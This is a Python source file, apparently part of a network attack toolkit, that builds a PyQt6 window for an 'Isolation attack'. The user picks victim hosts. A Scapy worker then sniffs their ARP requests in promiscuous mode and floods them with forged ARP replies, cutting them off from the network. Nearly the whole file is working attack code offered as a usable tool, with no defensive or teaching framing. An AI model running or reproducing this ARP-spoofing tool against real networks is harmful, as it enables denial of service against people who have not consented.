from PyQt6.QtCore import *
from PyQt6.QtGui import *
from PyQt6.QtWidgets import *
from components import HostList, InterfaceChooser, Toggle, DragDropHostList
from attacks import IsolationAttackSettings, handle_packet_isolation
from scapy.all import *

class AttackWorker(QObject):
    finished = pyqtSignal()

    def __init__(self, settings: IsolationAttackSettings):
        super().__init__()
        self.settings = settings
        self.entries = []

    def run(self):
        print('Attack starting')

        # promiscuous sniffing is necessary
        # since the victims' ARP requests are not
        # addressed at us
        conf.sniff_promisc = True

        self.sniffer = AsyncSniffer(
            iface=self.settings.interface.name,
            prn=lambda p: handle_packet_isolation(self.settings, p, self.add_to_storm)
        )
        self.sniffer.start()

        self.timer = QTimer(self)
        self.timer.timeout.connect(self.send_storm)
        self.timer.start(self.settings.response_interval * 1000)

    def add_to_storm(self, entry):
        if entry not in self.entries:
            self.entries.append(entry)

    def send_storm(self):
        for ip, victim in self.entries:
            packet = Ether() / ARP()
            packet[Ether].src = self.settings.interface.mac_addr
            packet[Ether].dst = victim.mac_addr
            packet[ARP].psrc = ip
            packet[ARP].pdst = victim.ip_addr
            packet[ARP].hwsrc = victim.mac_addr
            packet[ARP].hwdst = victim.mac_addr
            packet[ARP].op = 2

            sendp(
                packet,
                verbose=0,
                iface=self.settings.interface.name,
                count=self.settings.response_count)

    def stop(self):
        print('Attack stopping...')

        self.sniffer.stop(join=True)
        self.timer.stop()
        print('Attack stopped')
        conf.sniff_promisc = False
        self.finished.emit()

class IsolateWindow(QWidget):
    INTERFACE_CHOOSER = 'interface_chooser'
    HOST_LIST = 'host_list'
    VICTIM_LIST = 'victims'
    ACTIVATION = 'activation'

    stop_attack = pyqtSignal()

    def __init__(self):
        super().__init__()
        self.widgets = { }

        self.construct_layout()
        self.setup_behavior()
        self.widgets[self.INTERFACE_CHOOSER].scan()

    def construct_layout(self):
        self.setWindowTitle('Isolation attack')
        self.setFixedSize(QSize(600, 500))

        interface = self.widgets[self.INTERFACE_CHOOSER] = InterfaceChooser()
        hosts = self.widgets[self.HOST_LIST] = HostList()
        victims = self.widgets[self.VICTIM_LIST] = DragDropHostList(removable_items=True)
        activation = self.widgets[self.ACTIVATION] = Toggle(self, 'Stop', 'Start')

        victims.setAcceptDrops(True)
        victims.setDragDropMode(QAbstractItemView.DragDropMode.DragDrop)

        sublayout = QVBoxLayout()
        sublayout.addWidget(victims)
        sublayout.addWidget(activation)

        sublayout.setStretch(0, 3)
        sublayout.setStretch(1, 1)

        settings_box = QGroupBox()
        settings_box.setTitle('Attack settings')
        settings_box.setLayout(sublayout)

        layout = QGridLayout(self)
        layout.addWidget(interface, 0, 0)
        layout.addWidget(hosts, 1, 0)
        layout.addWidget(settings_box, 0, 1, 2, 1)

    def setup_behavior(self):
        interface = self.widgets[self.INTERFACE_CHOOSER]
        hosts = self.widgets[self.HOST_LIST]

        interface.interface_changed.connect(hosts.set_interface)

        self.widgets[self.ACTIVATION].state_changed.connect(self.on_toggle)

    def on_toggle(self, active: bool):
        if active:
            self.thread = QThread()
            self.worker = AttackWorker(IsolationAttackSettings(
                self.widgets[self.INTERFACE_CHOOSER].selected,
                self.widgets[self.VICTIM_LIST].hosts(),
                3,
                1
            ))
            self.worker.moveToThread(self.thread)

            # connect signals and slots
            self.thread.started.connect(self.worker.run)
            self.stop_attack.connect(self.worker.stop)
            self.worker.finished.connect(self.worker.deleteLater)
            self.worker.finished.connect(self.thread.quit)
            self.thread.finished.connect(self.thread.deleteLater)

            self.thread.finished.connect(lambda: self.widgets[self.ACTIVATION].setEnabled(True))

            # start the attack
            self.thread.start()
        else:
            self.widgets[self.ACTIVATION].setEnabled(False)
            self.stop_attack.emit()
